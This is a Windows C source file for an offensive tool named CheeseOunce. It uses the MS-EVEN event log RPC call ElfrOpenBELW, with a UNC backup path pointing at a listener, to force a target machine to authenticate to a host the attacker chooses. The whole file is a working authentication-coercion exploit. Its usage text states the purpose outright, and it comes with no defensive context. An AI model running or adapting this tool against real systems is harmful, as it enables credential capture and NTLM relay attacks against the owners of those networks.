#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include "ms-even_h.h"

#pragma comment(lib, "rpcrt4.lib")

//Ö¥Ê¿Ñ©±ª aka:CheeseOunce @evilash

int wmain(int argc, wchar_t* argv[]) {

    NTSTATUS status;
    IELF_HANDLE loghandle = NULL;
    RPC_UNICODE_STRING BackupFileName;
    wchar_t* target = NULL;
    wchar_t UncPath[128];

    if (argc != 3)
    {
        wprintf(L"Usage: %s <listener> <target>\n", argv[0]);
        wprintf(L"CheeseOunce USE ElfrOpenBELW TO FORCE AUTH VIA MS-EVEN\n");
        return 1;
    }
    else {
    swprintf(UncPath, 128, L"\\??\\UNC\\%s\\scratch\\xx", argv[1]);
    target = argv[2];
    }

    RpcTryExcept
    {

        BackupFileName.Buffer = UncPath;
        BackupFileName.Length = BackupFileName.MaximumLength = wcslen(UncPath) * sizeof(WCHAR);

        status = ElfrOpenBELW((EVENTLOG_HANDLE_W)target, &BackupFileName, 1, 1, &loghandle);

        //status = ElfrOpenELW((EVENTLOG_HANDLE_W)target, &BackupFileName, NULL ,1, 1, &loghandle);

        printf("0x%08x\n", status);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
        return 1;
    }
    RpcEndExcept

        return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

